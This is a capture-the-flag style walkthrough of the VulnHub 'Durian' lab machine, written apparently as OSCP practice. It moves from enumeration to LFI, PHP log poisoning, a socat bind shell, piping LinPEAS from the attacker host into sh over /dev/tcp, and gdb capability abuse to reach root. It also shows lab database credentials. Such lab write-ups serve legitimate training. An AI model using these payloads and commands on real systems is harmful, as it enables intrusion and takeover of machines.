# OSCP Prep - *SunCSR: Durian*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/durian-1,553/) and set it up with VMWare Workstation Pro 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance Part 1

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -n -v -T4 -p- 192.168.159.184                                                                                                                                                      
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 16:30 EDT
Initiating ARP Ping Scan at 16:30
Scanning 192.168.159.184 [1 port]
Completed ARP Ping Scan at 16:30, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:30
Scanning 192.168.159.184 [65535 ports]
Discovered open port 22/tcp on 192.168.159.184
Discovered open port 80/tcp on 192.168.159.184
Discovered open port 8000/tcp on 192.168.159.184
Discovered open port 7080/tcp on 192.168.159.184
Discovered open port 8088/tcp on 192.168.159.184
Completed SYN Stealth Scan at 16:30, 7.21s elapsed (65535 total ports)
Nmap scan report for 192.168.159.184
Host is up (0.00075s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
7080/tcp open  empowerid
8000/tcp open  http-alt
8088/tcp open  radan-http
MAC Address: 00:0C:29:8B:05:0D (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

There are several HTTP ports open, so we'll do some more aggressive enumeration on them.

The output is too long, so I'll only show the more specific things that are worth noting.

```
$ sudo nmap -sS -sV -sC -PA -A -T2 -v -Pn -n -f --version-all --osscan-guess --script http-enum.nse,http-headers.nse,http-methods.nse,http-auth.nse,http-brute.nse -p 80,7080,8000,8088 192.168.159.184

...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-enum: 
|   /blog/: Blog
|_  /blog/wp-login.php: Wordpress login page.
...
...
7080/tcp open  ssl/empowerid LiteSpeed
|_http-server-header: LiteSpeed
| http-enum: 
|_  /login.php: Possible admin folder
...
...
8000/tcp open  http          nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-enum: 
|_  /blog/wp-login.php: Wordpress login page.
...
...
8088/tcp open  radan-http    LiteSpeed
|_http-server-header: LiteSpeed
...
...
Nmap done: 1 IP address (1 host up) scanned in 719.02 seconds
           Raw packets sent: 49 (3.760KB) | Rcvd: 33 (2.704KB)
```

Evidently, two of them involve a Wordpress page and two of them are managed by LiteSpeed.

Running Nikto scans on each web server doesn't give any new information, so I moved on to directory enumeration.

Starting with port 80, I run gobuster to look for directories.

```
$ sudo gobuster fuzz -u http://192.168.159.184/FUZZ/ -w seclists/Discovery/Web-Content/raft-large-directories.txt -b 404,400 -k                                                                       
[sudo] password for meowmycks: 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.184/FUZZ/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Excluded Status codes:   404,400
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/24 16:46:13 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=403] [Length=280] http://192.168.159.184/icons/
Found: [Status=200] [Length=953] http://192.168.159.184/cgi-data/
Found: [Status=403] [Length=280] http://192.168.159.184/server-status/
Progress: 23387 / 62285 (37.55%)[ERROR] 2022/10/24 16:46:19 [!] parse "http://192.168.159.184/error\x1f_log/": net/url: invalid control character in URL
===============================================================
2022/10/24 16:46:30 Finished
===============================================================
```

The folder ```cgi-data``` is accessible, so I open it and find a php file.

![image](https://user-images.githubusercontent.com/45502375/197640812-b0ab4df4-e8db-467b-95db-ded736f8b4f3.png)

## Step 2 - Exploitation Part 1

Viewing the source code of this file reveals a comment that essentially exposes an LFI vulnerability.

![image](https://user-images.githubusercontent.com/45502375/197641222-badba36e-5aa1-4884-aa2a-74b4aeb0dfdf.png)

To confirm my suspicions, I try adding the parameter ```file``` to the URL and the value of ```../../../../../../../etc/passwd```. Standard for LFI's.

![image](https://user-images.githubusercontent.com/45502375/197641167-a3bc330a-154b-470a-ab63-bb9ce1494fa4.png)

Nice.

Now that I know there's an LFI vulnerability, I look for other vulnerabilities where I can take advantage of this.

Having access to the ```/etc/passwd``` file, I try running Hydra on SSH for the user account ```durian```, but I don't get anywhere with it.

## Step 3 - Reconnaissance Part 2

I perform more directory enumeration on the other web servers and I find a file uploading module on port 8088.

```
$ sudo gobuster fuzz -u http://192.168.159.184:8088/FUZZ -w seclists/Discovery/Web-Content/raft-large-files.txt -b 404,403,400 -k
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.184:8088/FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-files.txt
[+] Excluded Status codes:   404,403,400
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/24 17:05:34 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=765] http://192.168.159.184:8088/index.html
Found: [Status=301] [Length=1260] http://192.168.159.184:8088/.
Found: [Status=200] [Length=1770] http://192.168.159.184:8088/upload.php
Found: [Status=200] [Length=195] http://192.168.159.184:8088/error404.html
Found: [Status=200] [Length=6520] http://192.168.159.184:8088/upload.html
Progress: 24311 / 37051 (65.61%)[ERROR] 2022/10/24 17:05:39 [!] parse "http://192.168.159.184:8088/directory\t\te.g.": net/url: invalid control character in URL
===============================================================
2022/10/24 17:05:41 Finished
===============================================================
```

Investigating ```upload.html``` reveals this webpage.

![image](https://user-images.githubusercontent.com/45502375/197641774-6904b6f8-b63d-4cbb-aad6-7b1706cfb3fe.png)

Trying various file upload vulnerabilities to try and upload a PHP reverse shell script, it reveals to whitelist only JPG files, so I try a JPG file with a PHP command Exiftool'd into it.

```
$ exiftool ReverseShells/ipcat.php.jpg
ExifTool Version Number         : 12.44
File Name                       : ipcat.php.jpg
...
Notes                           : <?php system($_GET["cmd"]); ?>
Comment                         : <?php system($_GET["cmd"]); ?>
```

![image](https://user-images.githubusercontent.com/45502375/197642173-fc58c976-dfd2-45c7-a11b-44a42ee98ef3.png)

Having done that, I tried accessing the file via the LFI vulnerability I found earlier, but this ended up not working.

I moved on to directory enumeration on port 8000. This server had Wordpress files that could be downloaded, so I ran WPScan on it.

Since the Wordpress directory was ```http://[IP]/blog/```, I ran various enumerations on there.

```
$ sudo wpscan --url http://192.168.159.184:8000/blog/ --random-user-agent --force -e
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.159.184:8000/blog/ [192.168.159.184]
[+] Started: Mon Oct 24 16:49:52 2022
...
...
...
[i] Config Backup(s) Identified:

[!] http://192.168.159.184:8000/blog/wp-config-sample.php
 | Found By: Direct Access (Aggressive Detection)

[!] http://192.168.159.184:8000/blog/wp-config.php
 | Found By: Direct Access (Aggressive Detection)
...
```

After investigating ```/blog/wp-config.php```, I found the database credentials ```wordpressuser:7qV2@V$j5A4$bS42wy```. I saved these for later.

```
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', '7qV2@V$j5A4$bS42wy' );
```

There was another directory on port 8088 called ```/protected/``` which was password-protected with HTTP Basic Authentication. However, the credentials didn't work here. This directory becomes important later though.

Lastly, I investigated the web server on port 7080 and found a WebAdmin login for OoenLiteSpeed.

![image](https://user-images.githubusercontent.com/45502375/197644049-66e3c936-8f57-4cc1-b94b-779a10fdd867.png)

I tried the credentials I found earlier here too, to no avail.

Then I tried a different approach.

## Step 4 - Exploitation Part 2

Since I had access to a LFI vulnerability, I could look at config files and log files as well.

If I was attempting to authenticate to different services, odds are that those login attempts were being logged somewhere.

After much trial and error, I discovered the access logging and error logging files for OpenLiteSpeed at ```/usr/local/lsws/logs/access.log``` ```/usr/local/lsws/logs/error.log``` respectively.

Investigating the access logs didn't show much interesting information. However, the error logs showed much more information, including the recorded usernames used to authenticate into different services.

```
...
2022-10-24 16:47:12.189900 [INFO] [192.168.159.128:44938-924#Example] User 'cxsdk' failed to authenticate.
2022-10-24 16:47:12.194156 [INFO] [192.168.159.128:44938-925#Example] User 'root' failed to authenticate.
2022-10-24 16:47:12.197011 [INFO] [192.168.159.128:44938-926#Example] User 'ADMIN' failed to authenticate.
...
```

I attempted a log poisoning attack where I injected PHP command execution in the username field. I tried this on both the OpenLiteSpeed WebAdmin login page and the HTTP Basic Authentication page and checked the logs.

```
2022-10-24 17:26:21.836007 [NOTICE] [192.168.159.128:38654:HTTP2-15#_AdminVHost] [STDERR] [WebAdmin Console] Failed Login Attempt - username:\<\?php system\(\$_GET\["cmd"\]\)\; \?\> ip:192.168.159.128 url:
...
2022-10-24 17:29:06.227908 [INFO] [192.168.159.128:55350#Example] User '' failed to authenticate.
```

The WebAdmin login successfully escaped the injected PHP code, but it didn't look like the HTTP Basic Auth method did as well.

The next thing I tried was adding the parameter ```cmd``` with the value ```id```.

The final payload URL was ```http://192.168.159.184/cgi-data/getImage.php?file=../../../../../../../../usr/local/lsws/logs/error.log&cmd=id```

After executing this, I found my golden ticket.

```
2022-10-24 17:29:06.227908 [INFO] [192.168.159.128:55350#Example] User 'uid=33(www-data) gid=33(www-data) groups=33(www-data)
' failed to authenticate.
```

The next commands I tried were a series of ```which```'s to see what connection-establishing tools I had. From this, I discovered ```socat``` installed on the machine.

```
2022-10-24 17:29:06.227908 [INFO] [192.168.159.128:55350#Example] User '/usr/bin/socat
' failed to authenticate.
```

Knowing this, I created a Socat bind shell payload as the following command: ```socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash```

The final payload URL was ```http://192.168.159.184/cgi-data/getImage.php?file=../../../../../../../../usr/local/lsws/logs/error.log&cmd=socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash```

After executing this, the page hung. This indicated to me that the bind shell worked, so I started Netcat and successfully established a connection.

```
$ sudo nc 192.168.159.184 4443                                                                                                                                                                         
[sudo] password for meowmycks: 
whoami
www-data
```

## Step 5 - Privilege Escalation

After upgrading to a TTY interactive shell, I set myself up to be able to run the LinPEAS script on the machine to perform privesc enumeration.

I started a Netcat listener on my attacker machine with the command ```sudo nc -q 5 -lvnp 80 < linpeas.sh```.

```
$ sudo nc -q 5 -lvnp 80 < linpeas.sh
listening on [any] 80 ...
```

Then I started a standard TCP connection on the target machine to download the LinPEAS script and immediately run it using ```sh``` once connected.

```
www-data@durian:/var/www/html/cgi-data$ cd /tmp
www-data@durian:/tmp$ cat < /dev/tcp/192.168.159.128/80 | sh
```

LinPEAS successfully ran and discovered a privesc window via a binary application with privileged capabilities.

More specifically, it detected ```/usr/bin/gdb``` with ```cap_setuid+ep``` capabilities. Meaning, it had the ability to manipulate its own process UID to that of a different user, including ```root```.

Therefore, using GTFObins, I exploited the exposed capability.

![image](https://user-images.githubusercontent.com/45502375/197659617-1a8f2ac0-d3d4-4d80-b1d4-57a571dc0981.png)

```
which gdb
/usr/bin/gdb

/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit

GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".

whoami
root
```

All I had to do now was get the flag in ```/root```.

```
cd /root

ls
proof.txt

cat proof.txt
SunCSR_Team.af6d45da1f1181347b9e2139f23c6a5b
```
